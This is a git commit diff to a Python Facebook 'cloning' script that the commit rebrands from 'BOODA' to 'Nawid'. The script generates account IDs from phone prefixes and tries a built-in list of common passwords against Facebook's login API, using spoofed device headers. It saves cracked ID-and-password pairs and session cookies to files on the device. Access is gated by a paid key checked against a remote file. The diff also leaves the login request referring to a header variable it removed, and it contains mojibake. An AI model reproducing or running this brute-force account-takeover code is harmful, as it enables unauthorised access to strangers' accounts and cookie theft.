7decd9d6df5608540e3a404805440e3c3d637659
R-SAhmad <142306118+R-SAhmad@users.noreply.github.com>
2023-08-18 19:47:18 +0430

    Add files via upload

--- AhmadRR.py
+++ AhmadRR.py
@@ -19,28 +19,29 @@ try:
 except ModuleNotFoundError: 
 	print('\n Installing missing modules ...')
 	os.system('pip install requests bs4 futures==2 > /dev/null')
-	os.system('python BOODA.py')
+	os.system('python Nawid .py')
 print('\n\033[1;37m Cheking for updetes...');time.sleep(3)
 
 
 print('\n\033[1;33m join my facebook groph');time.sleep(1)
-os.system('xdg-open https://www.facebook.com/booda.120130')
+os.system('xdg-open https://www.facebook.com/Nawid .120130')
 
 logo = """\033[1;32m
-`888888b.    .d88888b.   .d88888b.  8888888b.        d8888 
-888  "88b  d88P" "Y88b d88P" "Y88b 888  "Y88b      d88888 
-888  .88P  888     888 888     888 888    888     d88P888 
-8888888K.  888     888 888     888 888    888    d88P 888 
-888  "Y88b 888     888 888     888 888    888   d88P  888 
-888    888 888     888 888     888 888    888  d88P   888 
-888   d88P Y88b. .d88P Y88b. .d88P 888  .d88P d8888888888 
-8888888P"   "Y88888P"   "Y88888P"  8888888P" d88P     888 
+ $
+$$\   $$\                                         $$\ $$\           $$\       
+$$$\  $$ |                                        $$ |$$ |          $$ |      
+$$$$\ $$ | $$$$$$\   $$$$$$\   $$$$$$\  $$\   $$\ $$ |$$ | $$$$$$\  $$$$$$$\  
+$$ $$\$$ |$$  __$$\ $$  __$$\ $$  __$$\ $$ |  $$ |$$ |$$ | \____$$\ $$  __$$\ 
+$$ \$$$$ |$$ /  $$ |$$ /  $$ |$$ |  \__|$$ |  $$ |$$ |$$ | $$$$$$$ |$$ |  $$ |
+$$ |\$$$ |$$ |  $$ |$$ |  $$ |$$ |      $$ |  $$ |$$ |$$ |$$  __$$ |$$ |  $$ |
+$$ | \$$ |\$$$$$$  |\$$$$$$  |$$ |      \$$$$$$  |$$ |$$ |\$$$$$$$ |$$ |  $$ |
+\__|  \__| \______/  \______/ \__|       \______/ \__|\__| \_______|\__|  \__|                                                         
 \033[1;32m------------------------------------------------
- Owner        :  
- AUTHOR       :  𝑴𝑹 𝒀𝑨𝑰𝑺𝑹
- WORKING      :  𝑶𝑵𝑳𝒀 𝑺𝑰𝑴 𝑾𝑶𝑹𝑲𝑰𝑵𝑮
- FRIEND         :  𝑶𝑴𝑰𝑫 𝒁𝑬𝑨 & 𝑰𝑩𝑹𝑨𝑯𝑰𝑴𝑰
- VIRSION      :  1.1
+ Owner        :  Nwid
+ AUTHOR       :  ð‘´ð‘¹ jan
+ WORKING      :  onle sim card
+ FRIEND         :  khanzada
+ VIRSION      :  99.99
 \033[1;37m------------------------------------------------"""
 def linex():
 	print('\033[1;37m----------------------------------------------')
@@ -64,9 +65,9 @@ def cek_apk(session,coki):
 	x = sop.find("form",method="post")
 	game = [i.text for i in x.find_all("h3")]
 	if len(game)==0:
-		print(f'\r%s [%s•%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))
+		print(f'\r%s [%sâ€¢%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))
 	else:
-		print(f'\r{A} [•]%s Active Apks & Web 👇 '%(H))
+		print(f'\r{A} [â€¢]%s Active Apks & Web ðŸ‘‡ '%(H))
 		for i in range(len(game)):
 			print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
 	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
@@ -74,9 +75,9 @@ def cek_apk(session,coki):
 	x = sop.find("form",method="post")
 	game = [i.text for i in x.find_all("h3")]
 	if len(game)==0:
-		print(f'\r%s [%s•%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))
+		print(f'\r%s [%sâ€¢%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))
 	else:
-		print(f'\r{A} [•]%s Expired Apks & Web 👇 '%(M))
+		print(f'\r{A} [â€¢]%s Expired Apks & Web ðŸ‘‡ '%(M))
 		for i in range(len(game)):
 			print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
 loop=0
@@ -90,9 +91,9 @@ def approval():
   print(logo)
   uuid = str(os.geteuid()) + str(os.getlogin())
   id = "-".join(uuid)
-  sxb = 'BOODA'
+  sxb = 'Nawid '
   try:
-    httpCaht = requests.get('https://raw.githubusercontent.com/Boodaomido1/approvedone/main/bad').text
+    httpCaht = requests.get('https://raw.githubusercontent.com/22AS55/approvedone/main/bad').text
     if id in httpCaht:
       print("\033[1;32mYour Key is Successfully Approved")
       time.sleep(0.5)
@@ -111,25 +112,23 @@ def approval():
    #   print(" Other Countries : 5$ for Weekly  "#)
  #     print(" Other Countries : 15$ For Monthly")
     #  print('\033[1;37m----------------------------------------------')
- #     print(" Easypaisa  Number     : +93792468624")
-  #    print(" Trust Wallet Address : 0xb785952B2825366c8756fb65520F7Df8e0D145bD ")
-    #  input('\033[1;37m Press Enter For Contact To Admin ')
-     # tks = ('Hello%20BOODA%20Sir%20!%20Please%20Approve%20My%20Key%20The%20AFG.PRO%20Key%20Is%20:%20'+id);os.system('am start https://wa.me/+93792468624?text='+tks)
+ #     print(" Easypaisa  Number     : +93772533269")
+      input('\033[1;37m Press Enter For Contact To Admin ')
+      tks = ('Hello%20Nawid %20Sir%20!%20Please%20Approve%20My%20Key%20The%20AFG.PRO%20Key%20Is%20:%20'+id);os.system('am start https://wa.me/+93780076452?text='+tks)
       time.sleep(1)
       approval()
   except:
     sys.exit()
-approval() 
 def menu():
 			clear()
 			print('\033[1;33m------------------------------------------------')
-			print('\033[1;97m[1] RANDOM CLONING\n[2] CREATED BY 𝑩𝑶𝑶𝑫𝑨\n[0] EXIT')
+			print('\033[1;97m[1] RANDOM CLONING\n[2] CREATED BY AS genawar\n[0] EXIT')
 			print('\033[1;33m------------------------------------------------')
 			xd=input(' CHOOSE: ')
 			if xd in ['1','01']:
 				awmafghan()
 			if xd in ['02','2']:
-				os.system('xdg-open  https://www.facebook.com/booda.120130')
+				os.system('xdg-open  https://https://www.facebook.com/profile.php?id=100050570946816&mibextid=ZbWKwL/Nawid .120130')
 				menu()
 				exit()
 				menu()
@@ -148,7 +147,7 @@ def awmafghan():
 		except ValueError:
 			limit = 5000
 		clear()
-		print('\033[1;33m [1]METHODS[1]𝑶𝑵𝑳𝒀 𝑬𝑻𝑰𝑺𝑳𝑨𝑻 𝑾𝑶𝑹𝑲𝑰𝑵𝑮\n [2]METHODS[2] 𝑨𝑳𝑳 𝑨𝑭𝑮 𝑺𝑰𝑴 𝑾𝑶𝑹𝑲𝑰𝑵𝑮')
+		print('\033[1;33m [1]METHODS[1]ð‘¶ð‘µð‘³ð’€ ð‘¬ð‘»ð‘°ð‘ºð‘³ð‘¨ð‘» ð‘¾ð‘¶ð‘¹ð‘²ð‘°ð‘µð‘®\n [2]METHODS[2] ð‘¨ð‘³ð‘³ ð‘¨ð‘­ð‘® ð‘ºð‘°ð‘´ ð‘¾ð‘¶ð‘¹ð‘²ð‘°ð‘µð‘®')
 		print('\033[1;33m------------------------------------------------')
 		mthd = input(' CHOOSE: ')
 		clear()
@@ -169,9 +168,9 @@ def awmafghan():
 			for psx in user:
 				ids = code+psx
 				if pcs in ['1','01']:
-					passlist = [psx,ids,'afghan','afghan12345','afghan123','afghanistan','500500','100200','10002000','kabul123','Afghan123','Afghanistan','۱۲۳۴۵۶','khan12345', '۱۰۰۲۰۰','۵۰۰۵۰۰','۵۰۰۶۰۰']
+					passlist = [psx,ids,'afghan','afghan12345','afghan123','afghanistan','500500','100200','10002000','kabul123','Afghan123','Afghanistan','Û±Û²Û³Û´ÛµÛ¶','khan12345', 'Û±Û°Û°Û²Û°Û°','ÛµÛ°Û°ÛµÛ°Û°','ÛµÛ°Û°Û¶Û°Û°']
 				if pcs in ['2','02']:
-					passlist = [psx,ids,'afghan','afghan12345','afghan123','afghanistan','500500','100200','10002000','kabul123','Afghan123','Afghanistan','۱۲۳۴۵۶','khan12345', '۱۰۰۲۰۰','۵۰۰۵۰۰','۵۰۰۶۰۰']
+					passlist = [psx,ids,'afghan','afghan12345','afghan123','afghanistan','500500','100200','10002000','kabul123','Afghan123','Afghanistan','Û±Û²Û³Û´ÛµÛ¶','khan12345', 'Û±Û°Û°Û²Û°Û°','ÛµÛ°Û°ÛµÛ°Û°','ÛµÛ°Û°Û¶Û°Û°']
 				if mthd in ['1','01']:
 					AWM.submit(rndm,ids,passlist)
 				if mthd in ['2','02']:
@@ -192,7 +191,7 @@ scmodel = ['SC-04A', 'SC-01A', 'SC-02A', 'SC-03A', 'SC-05A', 'SC-06A', 'SC-07A',
 def rndm(ids,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [BOODA-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [Nawid -M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         for pas in passlist:
                                 application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                 application_version_code=str(random.randint(000000000,999999999))
@@ -204,7 +203,7 @@ def rndm(ids,passlist):
                                 awmfban=random.choice(awmfban1)
                                 gttt=random.choice(modelxxx)
                                 android_version=str(random.randrange(6,13))
-                                awm_ua = 'f[FB4A/;FBAV/YZWSES93;FBBV/{application_version};FBAN/FB4A;FBAV/YZWSES93;FBBV/{application_version_code};FBDM//{density=2.0,width=1920,height=2560};FBLC/pl_PL;FBRV/'+str(random.randint(000000000,999999999))+';FBCR/Etisalat;FBMF/VIVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Sony_Xperia_5D;FBSV/16;FBOP/6;FBCA/armeabi;FBSS/20;]'
+                                awm_ua = 'Dalvik/2.1.0 (Linux; U; Android 9; Pixel 3 Build/SPB4.210716.012) [FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +';FBBV/'+str(random.randint(1111111,7777777))+';FBDM/{density=3.5,width=1080,height=2160};FBLC/en_US;FBRV/'+str(random.randint(000000000,999999999))+str(random.randint(000000000,999999999))+';FBCR/Verizon;FBMF/google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 3;FBSV/10;FBOP/1;FBCA/arm64-v8a;]'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 device_family_id = str(uuid.uuid4())
@@ -235,42 +234,45 @@ def rndm(ids,passlist):
                                 "locale":"en_US","client_country_code":"US",
                                 'fb_api_req_friendly_name':'authenticate',
                                 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
-                                head ={
-                                'Authorization':f'OAuth {accessToken}',
-                                "X-FB-Connection-Type": 'unknown',
-                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 40000000)),
-                                "X-FB-Net-HNI": str(random.randint(2e4, 4e4)),
-                                'X-FB-SIM-HNI':str(random.randint(2e4, 4e4)),
-                                'X-FB-Friendly-Name':'authenticate',
-                                'X-FB-connection-quality':'EXCELLENT',
-                                'X-FB-device-group': '5120',
-                                'x-fb-session-id':'Unid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
-                                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
-                                'User-Agent':awm_ua,   
-                                'Accept-Encoding':'gzip, deflate',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                "X-FB-Client-IP": "True",
-                                "X-Tigon-Is-Retry": "False",
-                                "X-FB-Server-Cluster": "True",
-                                'X-FB-HTTP-Engine': 'Liger'
-                                }
+                                headers = {
+    'authority': 'm.facebook.com',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-AU,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control': 'max-age=0',
+    'dpr': '4',
+    'referer': 'https://m.facebook.com/',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-model': '"SH-03J"',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-ch-ua-platform-version': '"9.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
+    'viewport-width': '980',
+}
                                 url = 'https://b-api.facebook.com/method/auth.login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
                                         uid=str(q['uid'])
                                         try:
-                                                okk=open('/sdcard/BOODA-OK.txt','r').read()
+                                                okk=open('/sdcard/Nawid -OK.txt','r').read()
                                                 if uid in okk:pass
                                                 else:
                                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                                         print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
-                                                        open('/sdcard/BOODA-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                        open('/sdcard/Nawid -OK.txt','a').write(uid+'|'+pas+'\n')
                                                         oks.append(ids)
                                                         break
                                         except:
-                                                print('\r\r\033[1;33m [BOODA-OK] '+uid+' | '+pas+'\033[1;97m COOKIE = \033[1;37m'+coki+  '  ''  \033[0;97m')
-                                                open('/sdcard/BOODA--OK.txt','a').write(uid+'|'+pas+'\n')
+                                                print('\r\r\033[1;33m [Nawid -OK] '+uid+' | '+pas+'\033[1;97m COOKIE = \033[1;37m'+coki+  '  ''  \033[0;97m')
+                                                open('/sdcard/Nawid --OK.txt','a').write(uid+'|'+pas+'\n')
                                                 oks.append(ids)
                                                 break
                                 else:
@@ -283,7 +285,7 @@ def rndm(ids,passlist):
 def rndm2(ids,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [BOODA-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [Nawid -M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         for pas in passlist:
                                 application_version = str(random.randint(111,777))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,777))
                                 application_version_code=str(random.randint(000000000,777777777))
@@ -359,19 +361,19 @@ def rndm2(ids,passlist):
                                 if 'session_key' in q:
                                         uid=str(q['uid'])
                                         try:
-                                                okk=open('/sdcard/BOODAOK.txt','r').read()
+                                                okk=open('/sdcard/Nawid OK.txt','r').read()
                                                 if uid in okk:pass
                                                 else:
-                                                        print('\r\r\033[1;33m [BOODA-OK] '+str(uid)+' | '+pas+'\033[1;90m')
+                                                        print('\r\r\033[1;33m [Nawid -OK] '+str(uid)+' | '+pas+'\033[1;90m')
                                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                                         print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                                         print("Cookie: "+coki) 
-                                                        open('/sdcard/BOODA-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                        open('/sdcard/Nawid -OK.txt','a').write(uid+'|'+pas+'\n')
                                                         oks.append(ids)
                                                         break
                                         except:
-                                                print('\r\r\033[1;33m [BOODA-OK] '+uid+' | '+pas+'\033[1;97m')
-                                                open('/sdcard/BOODA-OK-OK.txt','a').write(uid+'|'+pas+'\n')
+                                                print('\r\r\033[1;33m [Nawid -OK] '+uid+' | '+pas+'\033[1;97m')
+                                                open('/sdcard/Nawid -OK-OK.txt','a').write(uid+'|'+pas+'\n')
                                                 oks.append(ids)
                                                 break
                                 else:
